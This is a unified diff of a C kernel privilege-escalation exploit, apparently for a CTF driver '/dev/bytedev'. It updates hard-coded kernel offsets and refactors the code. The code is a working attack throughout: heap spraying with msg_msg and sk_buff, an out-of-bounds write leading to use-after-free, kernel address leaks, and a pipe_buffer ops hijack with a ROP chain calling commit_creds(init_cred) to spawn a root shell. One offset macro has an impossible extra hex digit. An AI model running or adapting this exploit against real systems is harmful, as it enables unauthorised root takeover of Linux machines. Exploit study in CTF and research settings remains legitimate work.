@@ -13,6 +13,7 @@
 #include <sys/socket.h>
 #include <sys/syscall.h>
 #include <sys/ioctl.h>
+#include <sys/mman.h>
 #include <signal.h>
 
 #define PRIMARY_MSG_SIZE 0x1000
@@ -23,35 +24,34 @@
 #define VICTIM_MSG_TYPE     0x1337
 #define MSG_TAG     0xAAAAAAAA
 
-#define SOCKET_NUM 32
+#define SOCKET_NUM 4
 #define SK_BUFF_NUM 128
 #define PIPE_NUM 256
 #define MSG_QUEUE_NUM 4096
 
-#define ANON_PIPE_BUF_OPS 0xffffffff81e391c0
-#define PREPARE_KERNEL_CRED 0xffffffff810b3160
-#define INIT_CRED 0xffffffff8244aca0
-#define COMMIT_CREDS 0xffffffff810b2ec0
+#define ANON_PIPE_BUF_OPS 0xffffffff81e2d980
+#define PREPARE_KERNEL_CRED 0xffffffff810bb9c04
+#define INIT_CRED 0xffffffff8224aca0
+#define COMMIT_CREDS 0xffffffff810bb710
 #define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81a01086
-#define POP_RDI_RET 0xffffffff810014f9
-#define SWAPGS_RET 0xffffffff818895f9
-#define IRETQ 0xffffffff81a01117
+#define POP_RDI_RET 0xffffffff811af57d
 
 #define BYTEDEV_BUF_SIZE (4096 - sizeof(struct bytedev_data))
+
+#define BYTEDEV_MODE_CHANGE 0x114514
+#define BYTEDEV_BLK_IDX_CHANGE 0x1919810
 
 struct bytedev_data {
     unsigned short len, offset;
     char data[0];
 };
 
-struct list_head
-{
+struct list_head {
     uint64_t    next;
     uint64_t    prev;
 };
 
-struct msg_msg
-{
+struct msg_msg {
     struct list_head m_list;
     uint64_t    m_type;
     uint64_t    m_ts;
@@ -59,38 +59,34 @@ struct msg_msg
     uint64_t    security;
 };
 
-struct msg_msgseg
-{
+struct msg_msgseg {
     uint64_t    next;
 };
 
-struct 
-{
+struct {
     long mtype;
     char mtext[PRIMARY_MSG_SIZE - sizeof(struct msg_msg)];
 } primary_msg;
 
-struct 
-{
+struct  {
     long mtype;
     char mtext[SECONDARY_MSG_SIZE - sizeof(struct msg_msg)];
 } secondary_msg;
 
-/*
+/**
  * skb_shared_info need to take 320 bytes at the tail
  * so the max size of buf we should send is:
  * 1024 - 320 = 704
  */
-char fake_secondary_msg[704];
+char fake_second_msg[704];
 
-struct
-{
+struct {
     long mtype;
-    char mtext[0x1000 - sizeof(struct msg_msg) + 0x1000 - sizeof(struct msg_msgseg)];
+    char mtext[0x1000 - sizeof(struct msg_msg) \
+                + 0x1000 - sizeof(struct msg_msgseg)];
 } oob_msg;
 
-struct pipe_buffer
-{
+struct pipe_buffer {
     uint64_t    page;
     uint32_t    offset, len;
     uint64_t    ops;
@@ -99,8 +95,7 @@ struct pipe_buffer
     uint64_t    private;
 };
 
-struct pipe_buf_operations
-{
+struct pipe_buf_operations {
     uint64_t    confirm;
     uint64_t    release;
     uint64_t    try_steal;
@@ -117,7 +112,7 @@ void saveStatus()
             "pushf;"
             "pop user_rflags;"
             );
-    puts("\033[34m\033[1m[*] Status has been saved.\033[0m");
+    puts("\033[34m\033[1m[*] Status has been saved.\n\033[0m");
 }
 
 void errExit(char *msg)
@@ -139,9 +134,8 @@ int writeMsg(int msqid, void *msgp, size_t msgsz, long msgtyp)
 
 int peekMsg(int msqid, void *msgp, size_t msgsz, long msgtyp)
 {
-    int r;
-    r = msgrcv(msqid, msgp, msgsz - sizeof(long), msgtyp, MSG_COPY | IPC_NOWAIT);
-    return r;
+    int __msgsz = msgsz - sizeof(long);
+    return msgrcv(msqid, msgp, __msgsz, msgtyp, MSG_COPY | IPC_NOWAIT);
 }
 
 void buildMsg(struct msg_msg *msg, uint64_t m_list_next, uint64_t m_list_prev, 
@@ -157,13 +151,15 @@ void buildMsg(struct msg_msg *msg, uint64_t m_list_next, uint64_t m_list_prev,
 
 int spraySkBuff(int sk_socket[SOCKET_NUM][2], void *buf, size_t size)
 {
-    for (int i = 0; i < SOCKET_NUM; i++)
+    for (int i = 0; i < SOCKET_NUM; i++) {
         for (int j = 0; j < SK_BUFF_NUM; j++) {
             if (write(sk_socket[i][0], buf, size) < 0) {
                 printf("[x] failed to spray %d sk_buff for %d socket!", j, i);
                 return -1;
             }
         }
+    }
+
     return 0;
 }
 
@@ -177,6 +173,7 @@ int freeSkBuff(int sk_socket[SOCKET_NUM][2], void *buf, size_t size)
             }
         }
     }
+
     return 0;
 }
 
@@ -187,7 +184,7 @@ void trigerOutOfBoundWrite(int dev_fd, int socket_fd[2])
 
     /* free the first buffer in bytedev queue */
     trash_data = malloc(BYTEDEV_BUF_SIZE);
-    memset(trash_data, 0xc4, BYTEDEV_BUF_SIZE);
+    memset(trash_data, 0x84, BYTEDEV_BUF_SIZE);
 
     printf("[*] write %d bytes to dev \n", 
             write(dev_fd, trash_data, BYTEDEV_BUF_SIZE));
@@ -204,6 +201,10 @@ void trigerOutOfBoundWrite(int dev_fd, int socket_fd[2])
     /* make an OOB write */
     puts("[*] OOB write to nearby object...");
     write(dev_fd, trash_data, 1);
+
+    /* to prevent the memory leaking */
+    free(trash_data);
+    free(fake_data);
 }
 
 void getRootShell(void)
@@ -216,15 +217,32 @@ void getRootShell(void)
     puts("\033[32m\033[1m[+] trigerring root shell now...\033[0m\n");
 
     system("/bin/sh");
+    exit(EXIT_SUCCESS);
 }
 
-void signalHandler(int signum)
+void mmio_write(uint32_t *addr, uint32_t val)
 {
-    getRootShell();
+    *addr = val;
+}
+
+void test_dev(void)
+{
+    int dev_fd;
+
+    if ((dev_fd = open("/dev/bytedev", O_RDWR)) < 0) {
+        errExit("failed to open bytedev!");
+    }
+
+    ioctl(dev_fd, BYTEDEV_MODE_CHANGE, -1);
+    ioctl(dev_fd, BYTEDEV_BLK_IDX_CHANGE, 114514);
 }
 
 int main(int argc, char **argv, char **envp)
 {
+    if (argc == 2) {
+        test_dev();
+        return 0;
+    }
     int         oob_socket[2];
     int         sk_sockets[SOCKET_NUM][2];
     int         pipe_fd[PIPE_NUM][2];
@@ -241,10 +259,15 @@ int main(int argc, char **argv, char **envp)
     int         rop_idx;
     cpu_set_t   cpu_set;
     int         dev_fd;
+    int         ret;
 
-    /* Initialization */
+    /**
+     * Step.0
+     * Initialization
+     */
+
+    /* basic resources alloc */
     saveStatus();
-    signal(SIGSEGV, signalHandler); 
 
     if ((dev_fd = open("/dev/bytedev", O_RDWR)) < 0) {
         errExit("failed to open bytedev!");
@@ -259,26 +282,27 @@ int main(int argc, char **argv, char **envp)
     CPU_SET(0, &cpu_set);
     sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
     
-    // socket pairs to spray sk_buff
+    /* socket pairs to spray sk_buff */
     for (int i = 0; i < SOCKET_NUM; i++) {
         if (socketpair(AF_UNIX, SOCK_STREAM, 0, sk_sockets[i]) < 0) {
             errExit("failed to create socket pair!");
         }
     }
 
-    /*
+    /**
      * Step.I
      * build msg_queue, spray primary and secondary msg_msg,
      * and use OOB write to construct the overlapping
      */
-    puts("\n\033[34m\033[1m[*] Step.I spray msg_msg, construct overlapping object\033[0m");
+    puts("");
+    puts("\033[34m\033[1m[*] Step.I spray msg_msg for overlapping obj\033[0m");
 
     puts("[*] Build message queue...");
-    // build 4096 message queue
-    for (int i = 0; i < MSG_QUEUE_NUM; i++)
-    {
-        if ((msqid[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT)) < 0)
+    /* build 4096 message queue */
+    for (int i = 0; i < MSG_QUEUE_NUM; i++) {
+        if ((msqid[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT)) < 0) {
             errExit("failed to create msg_queue!");
+        }
     }
 
     puts("[*] Spray primary and secondary msg_msg...");
@@ -286,203 +310,234 @@ int main(int argc, char **argv, char **envp)
     memset(&primary_msg, 0, sizeof(primary_msg));
     memset(&secondary_msg, 0, sizeof(secondary_msg));
 
-    // spray primary and secondary message
-    for (int i = 0; i < MSG_QUEUE_NUM; i++)
-    {
+    /* spray primary and secondary message */
+    for (int i = 0; i < MSG_QUEUE_NUM; i++) {
         *(int *)&primary_msg.mtext[0] = MSG_TAG;
         *(int *)&primary_msg.mtext[4] = i;
-        if (writeMsg(msqid[i], &primary_msg, 
-                sizeof(primary_msg), PRIMARY_MSG_TYPE) < 0)
+
+        ret = writeMsg(msqid[i], 
+                    &primary_msg, 
+                    sizeof(primary_msg), 
+                    PRIMARY_MSG_TYPE);
+        if (ret < 0) {
             errExit("failed to send primary msg!");
+        }
 
         *(int *)&secondary_msg.mtext[0] = MSG_TAG;
         *(int *)&secondary_msg.mtext[4] = i;
-        if (writeMsg(msqid[i], &secondary_msg, 
-                sizeof(secondary_msg), SECONDARY_MSG_TYPE) < 0)
+
+        ret = writeMsg(msqid[i], 
+                    &secondary_msg, 
+                    sizeof(secondary_msg), 
+                    SECONDARY_MSG_TYPE);
+        if (ret < 0) {
             errExit("failed to send secondary msg!");
+        }
     }
 
-    // create hole in primary msg_msg
+    /* create hole in primary msg_msg */
     puts("[*] Create holes in primary msg_msg...");
-    for (int i = 0; i < MSG_QUEUE_NUM; i += 1024)
-    {
-        if (readMsg(msqid[i], &primary_msg, 
-                sizeof(primary_msg), PRIMARY_MSG_TYPE) < 0)
+    for (int i = 0; i < MSG_QUEUE_NUM; i += 1024) {
+        ret = readMsg(msqid[i], 
+                    &primary_msg, 
+                    sizeof(primary_msg), 
+                    PRIMARY_MSG_TYPE);
+        if (ret < 0) {
             errExit("failed to receive primary msg!");
+        }
     }
 
-    // triger off-by-null on primary msg_msg
+    /* triger off-by-null on primary msg_msg */
     puts("[*] Trigger OOB write to construct the overlapping...");
     trigerOutOfBoundWrite(dev_fd, oob_socket);
 
-    // find the queues that have the same secondary msg_msg
+    /* find the queues that have the same secondary msg_msg */
     puts("[*] Checking whether succeeded to make overlapping...");
     victim_qid = real_qid = -1;
-    for (int i = 0; i < MSG_QUEUE_NUM; i++)
-    {
-        if ((i % 512) == 0)  // the hole
+    for (int i = 0; i < MSG_QUEUE_NUM; i++) {
+        /* the hole */
+        if ((i % 256) == 0) {
             continue;
+        }
 
-        if (peekMsg(msqid[i], &secondary_msg, 
-                sizeof(secondary_msg), 1) < 0)
-        {
+        if (peekMsg(msqid[i], &secondary_msg, sizeof(secondary_msg), 1) < 0) {
             printf("[x] error qid: %d\n", i);
             errExit("failed to receive secondary msg!");
         }
 
-        if (*(int*) &secondary_msg.mtext[0] != MSG_TAG)
+        if (*(int*) &secondary_msg.mtext[0] != MSG_TAG) {
             errExit("failed to make corruption!");
+        }
         
-        if (*(int*) &secondary_msg.mtext[4] != i)
-        {
+        if (*(int*) &secondary_msg.mtext[4] != i) {
             victim_qid = i;
             real_qid = *(int*) &secondary_msg.mtext[4];
             break;
         }
     }
 
-    if (victim_qid < 0)
+    if (victim_qid < 0) {
         errExit("failed to make overlapping!");
+    }
     
-    printf("\033[32m\033[1m[+] victim qid:\033[0m %d \033[32m\033[1m real qid: \033[0m %d\n", 
-            victim_qid, real_qid);
+    printf("\033[32m\033[1m[+] victim qid:\033[0m %d ", victim_qid);
+    printf("\033[32m\033[1m real qid: \033[0m %d\n", real_qid);
 
-    /*
+    /**
      * Step.II
      * construct UAF
      */
     puts("\n\033[34m\033[1m[*] Step.II construct UAF\033[0m");
 
-    // free the victim secondary msg_msg, then we get a UAF
-    if (readMsg(msqid[real_qid], &secondary_msg, 
-                sizeof(secondary_msg), SECONDARY_MSG_TYPE) < 0)
+    /* free the victim secondary msg_msg, then we get a UAF */
+    ret = readMsg(msqid[real_qid], 
+                &secondary_msg, 
+                sizeof(secondary_msg), 
+                SECONDARY_MSG_TYPE);
+    if (ret < 0) {
         errExit("failed to receive secondary msg!");
+    }
     
     puts("\033[32m\033[1m[+] UAF construction complete!\033[0m");
 
-    /*
+    /**
      * Step.III
      * spray sk_buff to leak msg_msg addr
      * construct fake msg_msg to leak addr of UAF obj
      */
-    puts("\n\033[34m\033[1m[*] Step.III spray sk_buff to leak kheap addr\033[0m");
+    puts("");
+    puts("\033[34m\033[1m[*] Step.III spray sk_buff to leak kheap addr\033[0m");
 
-    // spray sk_buff to construct fake msg_msg
+    /* spray sk_buff to construct fake msg_msg */
     puts("[*] spray sk_buff...");
-    buildMsg((struct msg_msg *)fake_secondary_msg, 
+    buildMsg((struct msg_msg *)fake_second_msg, 
             *(uint64_t*)"arttnba3", *(uint64_t*)"arttnba3", 
-            VICTIM_MSG_TYPE, 0x1000 - sizeof(struct msg_msg), 0, 0);
-    if (spraySkBuff(sk_sockets, fake_secondary_msg, 
-            sizeof(fake_secondary_msg)) < 0)
+            VICTIM_MSG_TYPE, 0x1000 - sizeof(struct msg_msg), 
+            0, 0);
+    ret = spraySkBuff(sk_sockets, fake_second_msg, sizeof(fake_second_msg));
+    if (ret < 0) {
         errExit("failed to spray sk_buff!");
+    }
     
-    // use fake msg_msg to read OOB
+    /* use fake msg_msg to read OOB */
     puts("[*] OOB read from victim msg_msg");
     if (peekMsg(msqid[victim_qid], &oob_msg, sizeof(oob_msg), 1) < 0)
         errExit("failed to read victim msg!");
     
-    if (*(int *)&oob_msg.mtext[SECONDARY_MSG_SIZE] != MSG_TAG)
+    if (*(int *)&oob_msg.mtext[SECONDARY_MSG_SIZE] != MSG_TAG) {
         errExit("failed to rehit the UAF object!");
+    }
 
     nearby_msg = (struct msg_msg*) 
             &oob_msg.mtext[(SECONDARY_MSG_SIZE) - sizeof(struct msg_msg)];
     
-    printf("\033[32m\033[1m[+] addr of primary msg of msg nearby victim: \033[0m%llx\n", 
-            nearby_msg->m_list.prev);
+    printf("\033[32m\033[1m[+] addr of primary msg of msg nearby victim: ");
+    printf("\033[0m%llx\n", nearby_msg->m_list.prev);
 
-    // release and re-spray sk_buff to construct fake msg_msg
-    // so that we can make an arbitrary read on a primary msg_msg
-    if (freeSkBuff(sk_sockets, fake_secondary_msg, 
-            sizeof(fake_secondary_msg)) < 0)
+    /**
+     * release and re-spray sk_buff to construct fake msg_msg
+     * so that we can make an arbitrary read on a primary msg_msg
+     */
+    if (freeSkBuff(sk_sockets, fake_second_msg, sizeof(fake_second_msg)) < 0) {
         errExit("failed to release sk_buff!");
+    }
     
-    buildMsg((struct msg_msg *)fake_secondary_msg, 
+    buildMsg((struct msg_msg *)fake_second_msg, 
             *(uint64_t*)"arttnba3", *(uint64_t*)"arttnba3", 
             VICTIM_MSG_TYPE, sizeof(oob_msg.mtext), 
             nearby_msg->m_list.prev - 8, 0);
-    if (spraySkBuff(sk_sockets, fake_secondary_msg, 
-            sizeof(fake_secondary_msg)) < 0)
+    if (spraySkBuff(sk_sockets, fake_second_msg, sizeof(fake_second_msg)) < 0) {
         errExit("failed to spray sk_buff!");
+    }
     
     puts("[*] arbitrary read on primary msg of msg nearby victim");
-    if (peekMsg(msqid[victim_qid], &oob_msg, sizeof(oob_msg), 1) < 0)
+    if (peekMsg(msqid[victim_qid], &oob_msg, sizeof(oob_msg), 1) < 0) {
         errExit("failed to read victim msg!");
+    }
     
-    if (*(int *)&oob_msg.mtext[0x1000] != MSG_TAG)
+    if (*(int *)&oob_msg.mtext[0x1000] != MSG_TAG) {
         errExit("failed to rehit the UAF object!");
+    }
     
-    // cal the addr of UAF obj by the header we just read out
+    /* cal the addr of UAF obj by the header we just read out */
     nearby_msg_prim = (struct msg_msg*) 
             &oob_msg.mtext[0x1000 - sizeof(struct msg_msg)];
     victim_addr = nearby_msg_prim->m_list.next - 0x400;
     
     printf("\033[32m\033[1m[+] addr of msg next to victim: \033[0m%llx\n", 
             nearby_msg_prim->m_list.next);
-    printf("\033[32m\033[1m[+] addr of msg UAF object: \033[0m%llx\n", victim_addr);
+    printf("\033[32m\033[1m[+] addr of msg UAF object: \033[0m%llx\n", 
+            victim_addr);
 
-    /*
+    /**
      * Step.IV
      * fix the header of UAF obj and release it
      * spray pipe_buffer and leak the kernel base
      */
-    puts("\n\033[34m\033[1m[*] Step.IV spray pipe_buffer to leak kernel base\033[0m");
+    puts("");
+    puts("\033[34m\033[1m[*] Step.IV spray pipe_buffer to leak kbase\033[0m");
 
-    // re-construct the msg_msg to fix it
+    /* re-construct the msg_msg to fix it */
     puts("[*] fixing the UAF obj as a msg_msg...");
-    if (freeSkBuff(sk_sockets, fake_secondary_msg, 
-            sizeof(fake_secondary_msg)) < 0)
+    if (freeSkBuff(sk_sockets, fake_second_msg, sizeof(fake_second_msg)) < 0) {
         errExit("failed to release sk_buff!");
-    
-    memset(fake_secondary_msg, 0, sizeof(fake_secondary_msg));
-    for (int i = 0; i < 0x50; i++) {
-        ((size_t*)(fake_secondary_msg))[i] = victim_addr;
     }
+
     /**
      * XXX: we need to pass the check in lib/list_debug.c 
-     * what we didn't pass there is 
+     * what we used to not to pass there is 
      * "prev->next == entry" && "next->prev == entry"
      * so a valid memory with [addr of entry] should be set there
      */
-    buildMsg((struct msg_msg *)fake_secondary_msg, 
+    memset(fake_second_msg, 0, sizeof(fake_second_msg));
+    for (int i = 0; i < 0x50; i++) {
+        ((size_t*)(fake_second_msg))[i] = victim_addr;
+    }
+    buildMsg((struct msg_msg *)fake_second_msg, 
             victim_addr + 0x100, victim_addr + 0x100,
             VICTIM_MSG_TYPE, SECONDARY_MSG_SIZE - sizeof(struct msg_msg), 
             0, 0);
-    if (spraySkBuff(sk_sockets, fake_secondary_msg, 
-            sizeof(fake_secondary_msg)) < 0)
+    if (spraySkBuff(sk_sockets, fake_second_msg, sizeof(fake_second_msg)) < 0) {
         errExit("failed to spray sk_buff!");
+    }
     
-    // release UAF obj as secondary msg
+    /* release UAF obj as secondary msg */
     puts("[*] release UAF obj in message queue...");
-    if (readMsg(msqid[victim_qid], &secondary_msg, 
-                sizeof(secondary_msg), VICTIM_MSG_TYPE) < 0)
+    ret = readMsg(msqid[victim_qid], 
+                &secondary_msg, 
+                sizeof(secondary_msg), 
+                VICTIM_MSG_TYPE);
+    if (ret < 0) {
         errExit("failed to receive secondary msg!");
+    }
     
-    // spray pipe_buffer
+    /* spray pipe_buffer */
     puts("[*] spray pipe_buffer...");
-    for (int i = 0; i < PIPE_NUM; i++)
-    {
-        if (pipe(pipe_fd[i]) < 0)
+    for (int i = 0; i < PIPE_NUM; i++) {
+        if (pipe(pipe_fd[i]) < 0) {
             errExit("failed to create pipe!");
+        }
         
-        // write something to activate it
-        if (write(pipe_fd[i][1], "arttnba3", 8) < 0)
+        /* write something to activate the pipe */
+        if (write(pipe_fd[i][1], "arttnba3", 8) < 0) {
             errExit("failed to write the pipe!");
+        }
     }
 
-    // release the sk_buff to read pipe_buffer, leak kernel base
+    /* release the sk_buff to read pipe_buffer, leak kernel base */
     puts("[*] release sk_buff to read pipe_buffer...");
-    pipe_buf_ptr = (struct pipe_buffer *) &fake_secondary_msg;
-    for (int i = 0; i < SOCKET_NUM; i++)
-    {
-        for (int j = 0; j < SK_BUFF_NUM; j++)
-        {
-            if (read(sk_sockets[i][1], &fake_secondary_msg, 
-                    sizeof(fake_secondary_msg)) < 0)
+    pipe_buf_ptr = (struct pipe_buffer *) &fake_second_msg;
+    for (int i = 0; i < SOCKET_NUM; i++) {
+        for (int j = 0; j < SK_BUFF_NUM; j++) {
+            ret = read(sk_sockets[i][1], 
+                        &fake_second_msg, 
+                        sizeof(fake_second_msg));
+            if (ret < 0) {
                 errExit("failed to release sk_buff!");
+            }
             
-            if (pipe_buf_ptr->ops > 0xffffffff81000000)
-            {
-                printf("\033[32m\033[1m[+] got anon_pipe_buf_ops: \033[0m%llx\n", 
+            if (pipe_buf_ptr->ops > 0xffffffff81000000) {
+                printf("\033[32m\033[1m[+] got anon_pipe_buf_ops:\033[0m%llx\n", 
                         pipe_buf_ptr->ops);
                 kernel_offset = pipe_buf_ptr->ops - ANON_PIPE_BUF_OPS;
                 kernel_base = 0xffffffff81000000 + kernel_offset;
@@ -490,46 +545,38 @@ int main(int argc, char **argv, char **envp)
         }
     }
 
-    printf("\033[32m\033[1m[+] kernel base: \033[0m%llx \033[32m\033[1moffset: \033[0m%llx\n", 
-            kernel_base, kernel_offset);
+    printf("\033[32m\033[1m[+] kernel base: \033[0m%llx  ", kernel_base);
+    printf("\033[32m\033[1moffset: \033[0m%llx\n", kernel_offset);
     
-    /*
+    /**
      * Step.V
      * hijack the ops of pipe_buffer
      * free all pipe to trigger fake ptr
      * so that we hijack the RIP
      * construct a ROP on pipe_buffer
      */
-    puts("\n\033[34m\033[1m[*] Step.V hijack the ops of pipe_buffer, gain root privilege\033[0m");
+    puts("");
+    puts("\033[34m\033[1m[*] Step.V hijack the ops of pipe to root\033[0m");
 
     puts("[*] pre-construct data in userspace...");
-    pipe_buf_ptr = (struct pipe_buffer *) fake_secondary_msg;
+    pipe_buf_ptr = (struct pipe_buffer *) fake_second_msg;
     pipe_buf_ptr->ops = victim_addr;
 
-    /**
-     * TODO: gadget there should be fixed
-     */
-    ops_ptr = (struct pipe_buf_operations *) fake_secondary_msg;
+    ops_ptr = (struct pipe_buf_operations *) fake_second_msg;
     /* push rsi ; pop rsp ; pop rbx ; pop r12 ; ret */
-    ops_ptr->release = 0xffffffff81330a28 + kernel_offset;
+    ops_ptr->release = 0xffffffff8133151b + kernel_offset;
     /* ret */
-    ops_ptr->get = 0xffffffff81330a35 + kernel_offset;
+    ops_ptr->get = 0xffffffff81331534 + kernel_offset;
 
     rop_idx = 0;
-    rop_chain = (uint64_t*) &fake_secondary_msg[0x20];
+    rop_chain = (uint64_t*) &fake_second_msg[0x20];
     rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;
     rop_chain[rop_idx++] = kernel_offset + INIT_CRED;
     rop_chain[rop_idx++] = kernel_offset + COMMIT_CREDS;
-    /**
-     * XXX: swapgs_restore_regs function seems no more available,
-     * so we reuse the swapgs ; ret ; iretq
-     */
-    /*
-    rop_chain[rop_idx++] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE;
+    rop_chain[rop_idx++] = \
+                    kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE;
     rop_chain[rop_idx++] = *(uint64_t*) "arttnba3";
-    rop_chain[rop_idx++] = *(uint64_t*) "arttnba3";*/
-    rop_chain[rop_idx++] = kernel_offset + SWAPGS_RET;
-    rop_chain[rop_idx++] = kernel_offset + IRETQ;
+    rop_chain[rop_idx++] = *(uint64_t*) "arttnba3";
     rop_chain[rop_idx++] = (size_t) getRootShell;
     rop_chain[rop_idx++] = user_cs;
     rop_chain[rop_idx++] = user_rflags;
@@ -537,13 +584,13 @@ int main(int argc, char **argv, char **envp)
     rop_chain[rop_idx++] = user_ss;
 
     puts("[*] spray sk_buff to hijack pipe_buffer...");
-    if (spraySkBuff(sk_sockets, fake_secondary_msg, sizeof(fake_secondary_msg)) < 0) {
+    if (spraySkBuff(sk_sockets, fake_second_msg, sizeof(fake_second_msg)) < 0) {
         errExit("failed to spray sk_buff!");
     }
     
     puts("[*] trigger fake ops->release to hijack RIP...");
-    for (int i = 0; i < PIPE_NUM; i++)
-    {
+    //sleep(5);
+    for (int i = 0; i < PIPE_NUM; i++) {
         close(pipe_fd[i][0]);
         close(pipe_fd[i][1]);
     }
